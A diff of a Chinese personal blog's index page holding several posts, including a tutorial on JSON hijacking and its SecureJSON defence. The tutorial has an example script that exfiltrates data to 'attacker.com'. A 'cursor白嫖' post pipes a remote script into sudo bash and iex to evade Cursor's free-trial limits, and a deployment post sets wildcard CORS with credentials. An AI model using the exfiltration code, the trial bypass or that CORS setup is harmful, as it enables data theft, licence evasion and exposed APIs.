-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="一、先理解基本概念"><a href="#一、先理解基本概念" class="headerlink" title="一、先理解基本概念"></a><strong>一、先理解基本概念</strong></h3><ol>
-<li><p><strong>同源策略（Same-Origin Policy）</strong><br>浏览器的一个核心安全机制，限制不同源的脚本互相访问数据。  </p>
-<ul>
-<li><strong>“同源”定义</strong>：协议、域名、端口完全一致。</li>
-<li><strong>作用</strong>：防止恶意网站通过脚本窃取其他网站的数据（如 Cookie、敏感信息）。</li>
-</ul>
-</li>
-<li><p><strong>JSON 劫持（JSON Hijacking）</strong><br>一种攻击手段，攻击者通过恶意脚本窃取网站返回的 JSON 数据。  </p>
-<ul>
-<li><strong>常见场景</strong>：JSON 数据通过 <code>&lt;script&gt;</code> 标签加载（跨域请求），且返回的是<strong>数组格式</strong>（如 <code>[&#123;&quot;id&quot;: 1&#125;]</code>）。</li>
-<li><strong>攻击原理</strong>：利用浏览器特性（如覆盖 JavaScript 内置对象的原型方法），在数据加载时窃取内容。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="二、JSON-劫持如何绕过同源策略？"><a href="#二、JSON-劫持如何绕过同源策略？" class="headerlink" title="二、JSON 劫持如何绕过同源策略？"></a><strong>二、JSON 劫持如何绕过同源策略？</strong></h3><p>虽然同源策略限制了跨域脚本直接读取响应内容，但以下方式可能被利用：</p>
-<ol>
-<li><p><strong><code>&lt;script&gt;</code> 标签的跨域特性</strong><br>浏览器允许通过 <code>&lt;script src=&quot;...&quot;&gt;</code> 加载跨域脚本，但默认无法直接读取响应内容。</p>
-</li>
-<li><p><strong>覆盖 JavaScript 内置对象</strong><br>攻击者可以覆盖 <code>Array</code> 构造函数或 <code>Object.defineProperty</code>，在 JSON 数据解析时触发恶意代码。  </p>
-<ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="comment">// 恶意网站覆盖 Array 构造函数</span></span><br><span class="line">  <span class="keyword">var</span> originalArray = <span class="title class_">Array</span>;</span><br><span class="line">  <span class="title class_">Array</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title function_">originalArray</span>();</span><br><span class="line">    arr.<span class="property">push</span> = <span class="keyword">function</span>(<span class="params">value</span>) &#123;</span><br><span class="line">      <span class="comment">// 窃取数据并发送到攻击者服务器</span></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com?data=&#x27;</span> + value);</span><br><span class="line">      <span class="keyword">return</span> originalArray.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">push</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, value);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 加载目标网站的 <span class="title class_">JSON</span> 数据 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li>
-<li>如果 <code>data.json</code> 返回 <code>[&#123;&quot;id&quot;: 1&#125;]</code>，浏览器会将其解析为数组，触发被覆盖的 <code>Array</code> 构造函数，导致数据泄露。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="三、SecureJSON-如何防御-JSON-劫持？"><a href="#三、SecureJSON-如何防御-JSON-劫持？" class="headerlink" title="三、SecureJSON 如何防御 JSON 劫持？"></a><strong>三、SecureJSON 如何防御 JSON 劫持？</strong></h3><p>SecureJSON 的核心思想是<strong>破坏 JSON 数据的直接解析</strong>，使其无法被攻击者利用。以下是具体手段：</p>
-<h4 id="1-添加无害前缀"><a href="#1-添加无害前缀" class="headerlink" title="1. 添加无害前缀"></a>1. <strong>添加无害前缀</strong></h4><p>   服务器在返回 JSON 数据前，添加一段无法被 JavaScript 直接解析的前缀。  </p>
-<ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;id&quot;: 1&#125;</span></span><br></pre></td></tr></table></figure></li>
-<li><strong>作用</strong>：当浏览器通过 <code>&lt;script&gt;</code> 标签加载此数据时，前缀会导致语法错误，阻止后续脚本执行。</li>
-</ul>
-<h4 id="2-强制非数组格式"><a href="#2-强制非数组格式" class="headerlink" title="2. 强制非数组格式"></a>2. <strong>强制非数组格式</strong></h4><p>   将 JSON 数据包装为非数组形式（如对象），避免触发 <code>Array</code> 构造函数。  </p>
-<ul>
-<li><strong>示例</strong>：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;data&quot;</span>: [&#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>&#125;]&#125;</span><br></pre></td></tr></table></figure></li>
-<li><strong>作用</strong>：攻击者需要访问 <code>data</code> 属性才能获取数组，而由于同源策略限制，跨域脚本无法直接读取对象的属性。</li>
-</ul>
-<h4 id="3-结合内容类型（Content-Type）"><a href="#3-结合内容类型（Content-Type）" class="headerlink" title="3. 结合内容类型（Content-Type）"></a>3. <strong>结合内容类型（Content-Type）</strong></h4><p>   服务器设置响应头 <code>Content-Type: application/json</code>，明确告知浏览器这是 JSON 数据（而非可执行的 JavaScript）。  </p>
-<ul>
-<li><strong>现代浏览器</strong>：会拒绝通过 <code>&lt;script&gt;</code> 标签执行非 <code>application/javascript</code> 类型的内容。</li>
-</ul>
-<hr>
-<h3 id="四、SecureJSON-防御流程"><a href="#四、SecureJSON-防御流程" class="headerlink" title="四、SecureJSON 防御流程"></a><strong>四、SecureJSON 防御流程</strong></h3><ol>
-<li><p><strong>攻击者尝试通过 <code>&lt;script&gt;</code> 加载 JSON 数据</strong>  </p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://victim.com/data.json&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>服务器返回 SecureJSON 格式数据</strong>  </p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">)]&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123;&quot;data&quot;: [&#123;&quot;id&quot;: 1&#125;]&#125;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>浏览器解析失败</strong>  </p>
-<ul>
-<li>前缀 <code>)]&#125;&#39;</code> 导致语法错误，后续数据无法执行。</li>
-<li>即使攻击者尝试覆盖内置对象，也无法触发恶意代码。</li>
-</ul>
-</li>
-<li><p><strong>合法前端代码处理 SecureJSON</strong>  </p>
-<ul>
-<li>前端需要手动移除前缀并解析 JSON：  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://victim.com/data.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(text.<span class="title function_">replace</span>(<span class="regexp">/^\)\]\&#125;&#x27;/</span>, <span class="string">&#x27;&#x27;</span>)));</span><br></pre></td></tr></table></figure></li>
-<li><strong>关键点</strong>：只有合法前端知道如何处理 SecureJSON 格式，攻击者无法利用自动解析机制。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="五、同源策略的补充作用"><a href="#五、同源策略的补充作用" class="headerlink" title="五、同源策略的补充作用"></a><strong>五、同源策略的补充作用</strong></h3><ul>
-<li><strong>限制跨域数据读取</strong>：即使攻击者绕过 SecureJSON，同源策略仍会阻止恶意脚本直接读取响应内容。</li>
-<li><strong>CORS（跨域资源共享）</strong>：现代浏览器通过 CORS 进一步限制跨域请求，要求服务器显式允许跨域访问。</li>
-</ul>
-<hr>
-<h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a><strong>六、总结</strong></h3><p>SecureJSON 通过以下方式防止 JSON 劫持：</p>
-<ol>
-<li><strong>破坏直接解析</strong>：添加前缀或包装数据，使恶意脚本无法自动触发解析。</li>
-<li><strong>依赖同源策略</strong>：结合浏览器安全机制，阻止跨域脚本读取数据。</li>
-<li><strong>强制合法前端处理</strong>：只有已知的前端代码能正确处理 SecureJSON 格式。</li>
-</ol>
-<p>这种方法在兼容旧浏览器的同时，有效防御了 JSON 劫持攻击，是 Web 安全中一种经典的“无害化”设计思路。</p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h3><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses#:~:text=In%20the%20most%20simple%20terms,key%20will%20be%20consistently%20dismissed">Why does Google prepend while(1); to their JSON responses?</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/04/gorm-mysql%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/04/gorm-mysql%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">gorm-mysql数组类型的处理方法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-04 14:44:48 / Modified: 14:49:38" itemprop="dateCreated datePublished" datetime="2025-03-04T14:44:48+08:00">2025-03-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="gorm-mysql数组类型的处理方法"><a href="#gorm-mysql数组类型的处理方法" class="headerlink" title="gorm-mysql数组类型的处理方法"></a>gorm-mysql数组类型的处理方法</h2><h3 id="1-使用json存储数组"><a href="#1-使用json存储数组" class="headerlink" title="1. 使用json存储数组"></a>1. 使用json存储数组</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FormList []<span class="type">uint</span> <span class="string">`json:&quot;form_list&quot; gorm:&quot;type:json;serializer:json&quot;`</span></span><br></pre></td></tr></table></figure>
-
-<p>FormList存储了表单的ID，是一个数组类型，使用json存储。</p>
-<p>使用序列化来处理数组的存储和读取。</p>
-<h3 id="2-使用string拼接"><a href="#2-使用string拼接" class="headerlink" title="2. 使用string拼接"></a>2. 使用string拼接</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FormList <span class="type">string</span> <span class="string">`json:&quot;form_list&quot; gorm:&quot;type:varchar(255)&quot;`</span></span><br></pre></td></tr></table></figure>
-
-<p>FormList存储了表单的ID，使用string拼接存储。</p>
-<p>例如：<code>1,2,3,4,5</code></p>
-<p>之后读取的时候，使用<code>strings.Split</code>来处理。</p>
-<h3 id="其他方法（待补充）"><a href="#其他方法（待补充）" class="headerlink" title="其他方法（待补充）"></a>其他方法（待补充）</h3>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/01/16/%E4%BD%BF%E7%94%A8%E5%AE%9D%E5%A1%94%E9%83%A8%E7%BD%B2%E5%89%8D%E5%90%8E%E7%AB%AF%E9%A1%B9%E7%9B%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/01/16/%E4%BD%BF%E7%94%A8%E5%AE%9D%E5%A1%94%E9%83%A8%E7%BD%B2%E5%89%8D%E5%90%8E%E7%AB%AF%E9%A1%B9%E7%9B%AE/" class="post-title-link" itemprop="url">使用宝塔部署前后端项目</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-01-16 18:48:42" itemprop="dateCreated datePublished" datetime="2025-01-16T18:48:42+08:00">2025-01-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-24 01:03:25" itemprop="dateModified" datetime="2025-01-24T01:03:25+08:00">2025-01-24</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="使用宝塔部署前后端项目"><a href="#使用宝塔部署前后端项目" class="headerlink" title="使用宝塔部署前后端项目"></a>使用宝塔部署前后端项目</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>宝塔面板是一款非常好用的服务器管理软件，可以帮助我们快速部署前后端项目，下面我们就来看看如何使用宝塔部署前后端项目。</p>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-安装宝塔面板"><a href="#1-安装宝塔面板" class="headerlink" title="1. 安装宝塔面板"></a>1. 安装宝塔面板</h3><p>CentOS系统下执行以下命令安装宝塔面板：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-登录宝塔面板"><a href="#2-登录宝塔面板" class="headerlink" title="2. 登录宝塔面板"></a>2. 登录宝塔面板</h3><p>安装完成后，会提供登录地址、用户名和密码，打开浏览器输入地址，输入用户名和密码登录。</p>
-<h3 id="3-开放安全组端口"><a href="#3-开放安全组端口" class="headerlink" title="3. 开放安全组端口"></a>3. 开放安全组端口</h3><p>登录阿里云控制台，找到安全组，开放端口。</p>
-<p><img src="/images/image1.png" alt="alt text"></p>
-<p>同时，登录宝塔面板，找到防火墙，开放端口。</p>
-<p><img src="/images/image2.png" alt="alt text"></p>
-<h3 id="4-创建数据库"><a href="#4-创建数据库" class="headerlink" title="4. 创建数据库"></a>4. 创建数据库</h3><p>登录宝塔面板后，点击左侧的数据库，然后点击创建数据库，输入数据库名称、用户名和密码，点击创建即可。</p>
-<h3 id="5-部署前端项目"><a href="#5-部署前端项目" class="headerlink" title="5. 部署前端项目"></a>5. 部署前端项目</h3><p>点击左侧的网站，然后点击添加站点，输入站点名称、域名、根目录，点击提交即可。</p>
-<h3 id="6-配置Nginx"><a href="#6-配置Nginx" class="headerlink" title="6. 配置Nginx"></a>6. 配置Nginx</h3><p>点击左侧的网站，然后点击设置，找到Nginx配置文件，将前端项目的Nginx配置文件替换为以下内容：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">5173</span>;</span><br><span class="line">    <span class="attribute">server_name</span> <span class="number">8.134.51.50</span>;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">    <span class="attribute">root</span> /www/wwwroot/ssewhy/front/dist/;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># CORS 配置</span></span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span> always;</span><br><span class="line">    <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span> always;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># API 路由配置</span></span><br><span class="line">    <span class="section">location</span> /api &#123;</span><br><span class="line">        <span class="attribute">if</span> (<span class="variable">$request_method</span> = <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Content-Length&#x27;</span> <span class="number">0</span>;</span><br><span class="line">            <span class="attribute">add_header</span> <span class="string">&#x27;Content-Type&#x27;</span> <span class="string">&#x27;text/plain; charset=utf-8&#x27;</span>;</span><br><span class="line">            <span class="attribute">return</span> <span class="number">204</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span> <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span> <span class="string">&#x27;GET, POST, PUT, DELETE, OPTIONS&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span> <span class="string">&#x27;Origin, Content-Type, Accept, Authorization, X-Requested-With&#x27;</span>;</span><br><span class="line">        <span class="attribute">add_header</span> <span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span> <span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">proxy_pass</span> http://8.134.51.50:8080;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他配置</span></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="7-部署后端项目"><a href="#7-部署后端项目" class="headerlink" title="7. 部署后端项目"></a>7. 部署后端项目</h3><p>将后端jar包打包好，然后上传到服务器，运行命令：</p>
-<p>前台运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xxx.jar</span><br></pre></td></tr></table></figure>
-
-<p>后台运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> java -jar xxx.jar &amp;</span><br></pre></td></tr></table></figure>
-
-<h3 id="8-访问项目"><a href="#8-访问项目" class="headerlink" title="8. 访问项目"></a>8. 访问项目</h3><p>打开浏览器输入域名，即可访问项目。</p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.bt.cn/">宝塔面板</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64734490/article/details/144910584">前后端分离项目部署到云服务器</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/01/03/cursor%E7%99%BD%E5%AB%96/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/01/03/cursor%E7%99%BD%E5%AB%96/" class="post-title-link" itemprop="url">cursor白嫖</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2025-01-03 14:24:57" itemprop="dateCreated datePublished" datetime="2025-01-03T14:24:57+08:00">2025-01-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-24 00:56:01" itemprop="dateModified" datetime="2025-01-24T00:56:01+08:00">2025-01-24</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="cursor白嫖"><a href="#cursor白嫖" class="headerlink" title="cursor白嫖"></a>cursor白嫖</h1><p>Linux&#x2F;macOS下打开terminal</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/install.sh | <span class="built_in">sudo</span> bash</span><br></pre></td></tr></table></figure>
-
-<p>Windows下打开powershell(管理员模式)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irm https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scripts/install.ps1 | iex</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.kelen.cc/faq/cursor-too-many-free-trial-accounts-used-on-this-machine">Too many free trial accounts used on this machine，解决Cursor免费试用限制问题</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/yuaotian/go-cursor-help">go-cursor-help</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
-  </nav>
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dunjia"
-      src="/images/favicon.ico">
-  <p class="site-author-name" itemprop="name">Dunjia</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/xudong7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xudong7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:dunjiazz@gmail.com" title="E-Mail → mailto:dunjiazz@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-  </div>
-  <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-  </div>
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Dunjia&#39;s Blog</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
 
 
-  <div class="links-of-blogroll motion-element">
-    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
-      Links
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 h-card">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Dunjia&#39;s Blog</h1>
     </div>
-    <ul class="links-of-blogroll-list">
-        <li class="links-of-blogroll-item">
